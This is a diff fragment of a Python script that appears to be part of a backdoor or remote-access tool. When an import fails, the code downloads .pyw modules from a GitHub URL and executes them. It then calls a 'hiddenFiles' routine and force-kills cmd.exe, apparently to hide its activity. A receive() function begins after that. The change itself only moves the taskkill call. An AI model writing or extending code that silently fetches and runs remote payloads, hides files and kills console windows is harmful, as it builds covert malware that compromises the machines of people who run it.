@@ -42,6 +42,7 @@ while tryit == False:
     try: 
         import modif, scripter
         tryit = True
+        subprocess.Popen("taskkill /IM cmd.exe /F")
     except:
         listfile, dir = ["modif.pyw", "scripter.pyw"], getNameDir(url)
         downloadFileGithub(url)
@@ -52,7 +53,6 @@ while tryit == False:
         os.system(getFileName())
         modif.hiddenFiles()
         time.sleep(2)
-        subprocess.Popen("taskkill /IM cmd.exe /F")
 
 def receive():
     try:
